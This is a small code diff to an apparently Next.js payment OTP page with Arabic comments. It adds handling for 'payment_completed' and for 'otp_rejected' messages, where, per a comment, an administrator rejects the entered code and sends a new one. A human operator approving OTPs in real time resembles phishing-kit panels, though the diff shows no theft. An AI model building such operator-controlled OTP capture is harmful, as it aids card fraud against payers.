@@ -28,11 +28,11 @@ export default function PayOtpPage() {
 
     const unsubscribe = subscribe((msg: any) => {
       if (msg.sessionId === sessionId) {
-        if (msg.type === "payment_status_update") {
+        if (msg.type === "payment_status_update" || msg.type === "payment_completed") {
           // إذا كان هناك redirectUrl، انتقل للصفحة
           if (msg.redirectUrl) {
             window.location.href = msg.redirectUrl;
-          } else if (msg.paymentStatus === "approved") {
+          } else if (msg.paymentStatus === "completed") {
             setStatus("approved");
             setMessage("تمت الموافقة! جاري التحويل...");
             setTimeout(() => {
@@ -42,6 +42,11 @@ export default function PayOtpPage() {
             setStatus("rejected");
             setMessage("تم رفض الدفع. البيانات غير صحيحة.");
           }
+        } else if (msg.type === "otp_rejected") {
+          // المدير رفض الرمز وأرسل رمز جديد
+          setStatus("rejected");
+          setMessage(msg.message || "تم رفض الرمز. يرجى إدخال الرمز الجديد.");
+          setOtp(""); // مسح الرمز القديم
         }
       }
     });
